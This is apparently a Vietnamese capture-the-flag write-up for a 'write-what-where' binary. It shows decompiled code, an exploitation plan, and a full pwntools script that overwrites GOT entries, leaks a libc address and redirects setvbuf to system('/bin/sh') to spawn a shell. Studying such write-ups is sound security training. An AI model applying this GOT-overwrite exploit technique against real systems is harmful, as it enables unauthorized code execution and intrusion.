# write-what-where

## REVERSE FILE

Đưa vào IDA xem pseudocode
Hàm init của chương trình:
```sh
int init()
{
  setvbuf(stdin, 0LL, 2, 0LL);
  return setvbuf(_bss_start, 0LL, 2, 0LL);
}
```
Hàm main của chương trình: 
```sh
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  _DWORD *v3; // [rsp+0h] [rbp-30h]
  int buf; // [rsp+Ch] [rbp-24h] BYREF
  char nptr[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v6; // [rsp+28h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init();
  puts("write");
  puts("what?");
  read(0, &buf, 4uLL);
  puts("where?");
  read(0, nptr, 9uLL);
  v3 = (_DWORD *)atoi(nptr);
  *v3 = buf;
  exit(0);
}
```
Chương trình sẽ cho 2 lần nhập read với lần lượt length = 4 byte, 9 byte. 
Lần nhập đầu: Nhập giá trị cần ghi.
Lần nhập hai: Địa chỉ cho giá trị cần ghi.

Sau đó chương trình sẽ thoát.


## EXPLOIT

Exploit chương trình theo các bước sau:

* got.exit = địa chỉ main dưới hàm init (main + 33);

Chương trình sẽ lặp vô số lần, tạo điều kiện thuận lợi cho việc leak libc.

* got.setvbuf = plt.puts
* stdout = got.puts
* stdin = got.puts
* got.exit = main

Leak địa chỉ puts_address.

* got.exit = (main + 33).

Tính libc_base, system, /bin/sh rồi 

* got.setvbuf = system
* got.stdin = địa chỉ chuỗi "/bin/sh"
* got.exit = main.

Lúc này chương trình sẽ thực thi system("/bin/sh") và spawn shell.

File exploit
```sh
from pwn import * 
import struct
import time
s = process("./write-what-where")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")


#raw_input("debug")
main = 0x4011a9
#main = "4198825"
#got_exit = 0x404038
got_exit = "4210744"
got_puts = "4210712" #0x404018
plt_puts = "4198448"#0x401030
got_setvbuf = "4210728" #0x404028
got_setvbuf4 = "4210732"
duoi_init = "4198858" #0x4011ca
bss_start = "4210768" #0x404050
bss_start4 = "4210772"
stdin_ = "4210784"
stdin_4 = "4210788"
what = "4202500"


# #>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> LOCAL >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. cho jmp ve duoi init trong main
s.send("\xca\x11\x40\x00")
s.sendlineafter("where?",got_exit)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>.. ghi de setbuf
s.send("\x30\x10\x40\x00")
s.sendlineafter("where?",got_setvbuf)
time.sleep(0.5)

s.send("\x00\x00\x00\x00")
s.sendlineafter("where?",got_setvbuf4)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>.. ghi de bss_start

s.send("\x18\x40\x40\x00")
s.sendlineafter("where?",bss_start)

time.sleep(0.5)

s.send("\x00\x00\x00\x00")
s.sendlineafter("where?",bss_start4)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>.. ghi de stdin

s.send("\x18\x40\x40\x00")
s.sendlineafter("where?",stdin_)

time.sleep(0.5)

s.send("\x00\x00\x00\x00")
s.sendlineafter("where?",stdin_4)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. cho jmp ve main
s.send("\xa9\x11\x40\x00")
s.sendline(got_exit)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. LEAK puts address
# print ">> " + s.recv()
#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. TEMP
s.send("\x18\x40\x40\x00")
s.sendlineafter("where?",bss_start)

time.sleep(0.5)

s.recvline()

puts_addr = u64(s.recv(6)+"\x00\x00")
print "puts_addr >> " + hex(puts_addr)

libc.address = puts_addr - libc.symbols['puts']
system = libc.symbols['system'] #0x7fxxxxxxxxxx
binsh = next(libc.search("/bin/sh"))


h_sys = (system>>32)&0xffffffff
l_sys = (system)    &0xffffffff

h_sys = hex(h_sys)[4:6] + hex(h_sys)[2:4]
l_sys = hex(l_sys)[8:10] + hex(l_sys)[6:8] + hex(l_sys)[4:6] + hex(l_sys)[2:4]

h_sys1 = binascii.unhexlify(h_sys) + '\x00\x00'
l_sys1 = binascii.unhexlify(l_sys)




# print " >>>>>>>> " + h_sys2

h_bin = (binsh>>32)&0xffffffff
l_bin = (binsh)&0xffffffff

h_bin = hex(h_bin)[4:6] + hex(h_bin)[2:4]
l_bin = hex(l_bin)[8:10] + hex(l_bin)[6:8] + hex(l_bin)[4:6] + hex(l_bin)[2:4]

h_bin1 = binascii.unhexlify(h_bin) + '\x00\x00'
l_bin1 = binascii.unhexlify(l_bin)


print "libc >> " + hex(libc.address)
print "system >> " + hex(system)
print "binsh >> " + hex(binsh)
print "h_sys >> " + h_sys
print "l_sys >> " + l_sys

print "h_bin >> " + h_bin
print "l_bin >> " + l_bin

print "h_sys1 >> " + str(h_sys1)
print "l_sys1 >> " + str(l_sys1)
print "h_bin1 >> " + str(h_bin1)
print "l_bin1 >> " + str(l_bin1)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. cho jmp ve duoi init trong main
s.send("\xca\x11\x40\x00")
s.sendlineafter("where?",got_exit)

time.sleep(0.5)

print "1"

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>.. ghi de setbuf
s.send(l_sys1)
s.sendlineafter("where?",got_setvbuf)

time.sleep(0.5)

s.send(h_sys1)
s.sendlineafter("where?",got_setvbuf4)

time.sleep(0.5)

#>>>>>>>>>>>>>>>>>>>>>>>>>>>>.. ghi de stdin

s.send(l_bin1)
s.sendlineafter("where?",stdin_)

s.send(h_bin1)
s.sendlineafter("where?",stdin_4)

print "2"
#>>>>>>>>>>>>>>>>>>>>>>>>>>>.. cho jmp ve duoi init trong main
s.send("\xa9\x11\x40\x00")
s.sendline(got_exit)

s.interactive()
```